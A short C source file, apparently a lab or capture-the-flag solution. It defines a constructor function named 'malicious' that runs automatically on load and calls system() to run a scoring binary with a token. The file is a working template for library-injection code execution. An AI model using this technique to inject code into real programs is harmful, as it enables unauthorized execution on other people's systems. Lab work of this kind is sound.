#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 40b64424-242d-4c85-b475-c7020d8237aa");
}
